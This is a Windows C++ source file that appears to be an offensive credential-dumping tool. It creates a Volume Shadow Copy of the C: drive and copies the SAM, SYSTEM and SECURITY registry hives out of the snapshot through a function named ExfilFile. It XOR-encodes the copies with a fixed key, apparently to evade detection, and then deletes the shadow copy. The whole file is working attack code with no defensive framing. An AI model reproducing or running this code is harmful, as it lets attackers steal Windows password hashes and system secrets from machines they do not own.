#include <windows.h>
#include <stdio.h>
#include <vss.h>
#include <vswriter.h>
#include <vsbackup.h>

HRESULT create_shadow(PCWSTR volume, PWSTR *deviceObject, GUID *snapId)
{

    HRESULT result = CoInitializeEx(NULL, COINIT_MULTITHREADED);
    if (FAILED(result))
    {
        printf("[-] CoInitializeEx failed: 0x%08lx\n", result);
        return result;
    }

    IVssBackupComponents *pBackupComponents = NULL;
    result = CreateVssBackupComponents(&pBackupComponents);
    if (FAILED(result) || !pBackupComponents)
    {
        printf("[-] CreateVssBackupComponents failed: 0x%08lx\n", result);
        CoUninitialize();
        return result;
    }

    result = pBackupComponents->InitializeForBackup();
    if (FAILED(result))
    {
        printf("[-] InitializeForBackup failed: 0x%08lx\n", result);
        pBackupComponents->Release();
        CoUninitialize();
        return result;
    }

    BOOL supported = FALSE;
    result = pBackupComponents->IsVolumeSupported(GUID_NULL, (PWCHAR)volume, &supported);
    if (FAILED(result) || !supported)
    {
        printf("[-] IsVolumeSupported failed or volume not supported: 0x%08lx\n", result);
        pBackupComponents->Release();
        CoUninitialize();
        return result;
    }

    result = pBackupComponents->SetContext(VSS_CTX_BACKUP);
    if (FAILED(result))
    {
        printf("[-] SetContext failed: 0x%08lx\n", result);
        pBackupComponents->Release();
        CoUninitialize();
        return result;
    }

    result = pBackupComponents->SetBackupState(FALSE, FALSE, VSS_BT_FULL, FALSE);

    IVssAsync *pAsync = NULL;
    result = pBackupComponents->GatherWriterMetadata(&pAsync);
    if (SUCCEEDED(result) && pAsync)
    {
        result = pAsync->Wait();
        pAsync->Release();
    }

    VSS_ID snapshotSetId;
    result = pBackupComponents->StartSnapshotSet(&snapshotSetId);
    if (FAILED(result))
    {
        printf("[-] StartSnapshotSet failed: 0x%08lx\n", result);
        pBackupComponents->Release();
        CoUninitialize();
        return result;
    }

    VSS_ID snapshotId;
    result = pBackupComponents->AddToSnapshotSet((PWCHAR)volume, GUID_NULL, &snapshotId);
    if (FAILED(result))
    {
        printf("[-] AddToSnapshotSet failed: 0x%08lx\n", result);
        pBackupComponents->Release();
        CoUninitialize();
        return result;
    }

    IVssAsync *pAsync2 = NULL;
    result = pBackupComponents->PrepareForBackup(&pAsync2);
    if (SUCCEEDED(result) && pAsync2)
    {
        result = pAsync2->Wait();
        pAsync2->Release();
    }

    IVssAsync *pAsync3 = NULL;
    result = pBackupComponents->DoSnapshotSet(&pAsync3);
    if (SUCCEEDED(result) && pAsync3)
    {
        result = pAsync3->Wait();
        pAsync3->Release();
    }

    if (SUCCEEDED(result))
    {
        VSS_SNAPSHOT_PROP snapshotProp;
        result = pBackupComponents->GetSnapshotProperties(snapshotId, &snapshotProp);
        if (SUCCEEDED(result))
        {
            *deviceObject = snapshotProp.m_pwszSnapshotDeviceObject;
            *snapId = snapshotId;
            printf("[+] Shadow copy created: %ws\n", *deviceObject);
        }
        else
        {
            printf("[-] GetSnapshotProperties failed: 0x%08lx\n", result);
        }
    }

    pBackupComponents->Release();
    CoUninitialize();

    return result;
}

PWSTR GuidToStr(GUID guid)
{
    PWSTR guidString = NULL;
    StringFromCLSID(guid, &guidString);
    return guidString;
}

VOID view_shapshots()
{

    HRESULT result = CoInitializeEx(NULL, COINIT_MULTITHREADED);
    if (FAILED(result))
    {
        printf("[-] CoInitializeEx failed: 0x%08lx\n", result);
        return;
    }

    IVssBackupComponents *pBackupComponents = NULL;
    result = CreateVssBackupComponents(&pBackupComponents);
    if (FAILED(result) || !pBackupComponents)
    {
        printf("[-] CreateVssBackupComponents failed: 0x%08lx\n", result);
        CoUninitialize();
        return;
    }

    result = pBackupComponents->InitializeForBackup();
    if (FAILED(result))
    {
        printf("[-] InitializeForBackup failed: 0x%08lx\n", result);
        pBackupComponents->Release();
        CoUninitialize();
        return;
    }

    result = pBackupComponents->SetContext(VSS_CTX_BACKUP);
    if (FAILED(result))
    {
        printf("[-] SetContext failed: 0x%08lx\n", result);
        pBackupComponents->Release();
        CoUninitialize();
        return;
    }

    IVssEnumObject *pEnum = NULL;
    result = pBackupComponents->Query(GUID_NULL, VSS_OBJECT_NONE, VSS_OBJECT_SNAPSHOT, &pEnum);
    if (FAILED(result) || !pEnum)
    {
        printf("[-] Query failed: 0x%08lx\n", result);
        pBackupComponents->Release();
        CoUninitialize();
        return;
    }

    VSS_OBJECT_PROP snapshotProp = {};
    ULONG fetched = 0;
    int count = 0;

    while (true)
    {
        result = pEnum->Next(1, &snapshotProp, &fetched);
        if (result == S_FALSE || fetched == 0)
            break;
        if (FAILED(result))
            break;

        if (snapshotProp.Type == VSS_OBJECT_SNAPSHOT)
        {
            VSS_SNAPSHOT_PROP &snap = snapshotProp.Obj.Snap;
            count++;
            PWSTR guidString = GuidToStr(snap.m_SnapshotId);
            wprintf(L"[+] Snapshot %ld:\n", count);
            wprintf(L"    Snapshot ID: %ws\n", guidString);
            CoTaskMemFree(guidString);
            wprintf(L"    Snapshot Device Object: %ws\n", snap.m_pwszSnapshotDeviceObject);
            wprintf(L"    Snapshot Original Volume Name: %ws\n", snap.m_pwszOriginalVolumeName);
            wprintf(L"    Snapshot Creation Time: %lld\n", snap.m_tsCreationTimestamp);

            SYSTEMTIME st;
            FILETIME ftUTC, ftLocal;
            ftUTC.dwLowDateTime = (DWORD)(snap.m_tsCreationTimestamp & 0xFFFFFFFF);
            ftUTC.dwHighDateTime = (DWORD)(snap.m_tsCreationTimestamp >> 32);
            FileTimeToLocalFileTime(&ftUTC, &ftLocal);
            FileTimeToSystemTime(&ftLocal, &st);
            wprintf(L"    Snapshot Creation Time (Local): %02d/%02d/%04d %02d:%02d:%02d\n",
                    st.wMonth, st.wDay, st.wYear, st.wHour, st.wMinute, st.wSecond);
            wprintf(L"    Snapshot State: %ld\n", snap.m_eStatus);
            wprintf(L"    Snapshot Attributes: 0x%08lx\n", snap.m_lSnapshotAttributes);
            VssFreeSnapshotProperties(&snap);
        }
    }

    if (count == 0)
    {
        wprintf(L"[*] No snapshots found.\n");
    }
    else
    {
        wprintf(L"[*] Total snapshots found: %d\n", count);
    }

    pEnum->Release();
    pBackupComponents->Release();
    CoUninitialize();
}

BOOL delete_shadow(GUID snapshotId)
{
    HRESULT result = CoInitializeEx(NULL, COINIT_MULTITHREADED);
    if (FAILED(result))
    {
        printf("[-] CoInitializeEx failed: 0x%08lx\n", result);
        return FALSE;
    }

    IVssBackupComponents *pBackupComponents = NULL;
    result = CreateVssBackupComponents(&pBackupComponents);
    if (FAILED(result) || !pBackupComponents)
    {
        printf("[-] CreateVssBackupComponents failed: 0x%08lx\n", result);
        CoUninitialize();
        return FALSE;
    }

    result = pBackupComponents->InitializeForBackup();
    if (FAILED(result))
    {
        printf("[-] InitializeForBackup failed: 0x%08lx\n", result);
        pBackupComponents->Release();
        CoUninitialize();
        return FALSE;
    }

    result = pBackupComponents->SetContext(VSS_CTX_BACKUP);
    if (FAILED(result))
    {
        printf("[-] SetContext failed: 0x%08lx\n", result);
        pBackupComponents->Release();
        CoUninitialize();
        return FALSE;
    }

    LONG deletedSnapshots = 0;
    VSS_ID deletedSnapshotId = GUID_NULL;

    pBackupComponents->DeleteSnapshots(snapshotId, VSS_OBJECT_SNAPSHOT, TRUE, &deletedSnapshots, &deletedSnapshotId);

    BOOL success = (deletedSnapshots > 0);

    pBackupComponents->Release();
    CoUninitialize();

    return success;
}

VOID XorBuffer(PBYTE buffer, SIZE_T size, BYTE key)
{
    for (SIZE_T i = 0; i < size; i++)
    {
        buffer[i] ^= key;
    }
}

BOOL ExfilFile(PCWSTR deviceObject, PCWSTR targetFile, PCWSTR outputFileName)
{
    WCHAR SAMPath[256];
    // _snwprintf(SAMPath, 256, L"%ws\\Windows\\System32\\config\\SAM", deviceObject);
    _snwprintf(SAMPath, 256, L"%ws\\%ws", deviceObject, targetFile);

    wprintf(L"[*] %ws file path in shadow copy: %ws\n", targetFile, SAMPath);

    HANDLE hFile = NULL;
    hFile = CreateFileW(SAMPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE)
    {
        wprintf(L"[-] Failed to open %ws file in shadow copy: %d\n", targetFile, GetLastError());
        return FALSE;
    }

    LARGE_INTEGER fileSizelarge;
    if (!GetFileSizeEx(hFile, &fileSizelarge))
    {
        wprintf(L"[-] Failed to get %ws file size: %d\n", targetFile, GetLastError());
        CloseHandle(hFile);
        return FALSE;
    }

    SIZE_T fileSize = (SIZE_T)fileSizelarge.QuadPart;
    PBYTE buffer = fileSize ? (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, fileSize) : NULL;
    if (!buffer)
    {
        wprintf(L"[-] Failed to allocate memory for %ws file: %d\n", targetFile, GetLastError());
        CloseHandle(hFile);
        return FALSE;
    }

    DWORD bytesRead = 0;
    while (bytesRead < fileSize)
    {
        DWORD read = 0;
        if (!ReadFile(hFile, buffer + bytesRead, (DWORD)(fileSize - bytesRead), &read, NULL))
        {
            wprintf(L"[-] Failed to read %ws file: %d\n", targetFile, GetLastError());
            HeapFree(GetProcessHeap(), 0, buffer);
            CloseHandle(hFile);
            return FALSE;
        }
        if (read == 0)
            break;
        bytesRead += read;
    }

    XorBuffer(buffer, fileSize, 0xAA);

    HANDLE hOutputFile = CreateFileW(outputFileName, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hOutputFile == INVALID_HANDLE_VALUE)
    {
        wprintf(L"[-] Failed to create output file: %d\n", GetLastError());
        HeapFree(GetProcessHeap(), 0, buffer);
        CloseHandle(hFile);
        return FALSE;
    }

    DWORD bytesWritten = 0;
    while (bytesWritten < fileSize)
    {

        DWORD written = 0;
        if (!WriteFile(hOutputFile, buffer + bytesWritten, (DWORD)(fileSize - bytesWritten), &written, NULL))
        {
            wprintf(L"[-] Failed to write to output file: %d\n", GetLastError());
            HeapFree(GetProcessHeap(), 0, buffer);
            CloseHandle(hFile);
            CloseHandle(hOutputFile);
            return FALSE;
        }
        if (written == 0)
            break;
        bytesWritten += written;
    }

    wprintf(L"[*] %ws file copied and XORed successfully to %ws\n", targetFile, outputFileName);

    CloseHandle(hFile);
    HeapFree(GetProcessHeap(), 0, buffer);
    CloseHandle(hOutputFile);
    return TRUE;
}

int main()
{
    PCWSTR volume = L"C:\\";
    PWSTR deviceObject = NULL;
    GUID snapId = GUID_NULL;

    HRESULT result = create_shadow(volume, &deviceObject, &snapId);
    if (SUCCEEDED(result) && deviceObject)
    {
        wprintf(L"[+] Shadow copy created successfully: %ws (ID: %s)\n", deviceObject, GuidToStr(snapId));
    }

    view_shapshots();

    ExfilFile(deviceObject, L"Windows\\System32\\config\\SAM", L"SAM_copy.bin");
    ExfilFile(deviceObject, L"Windows\\System32\\config\\SYSTEM", L"SYSTEM_copy.bin");
    ExfilFile(deviceObject, L"Windows\\System32\\config\\SECURITY", L"SECURITY_copy.bin");

    if (!delete_shadow(snapId))
    {
        wprintf(L"[-] Failed to delete shadow copy.\n");
    }
    wprintf(L"[*] Shadow copy deleted successfully for %ws (ID: %s).\n", deviceObject, GuidToStr(snapId));
}
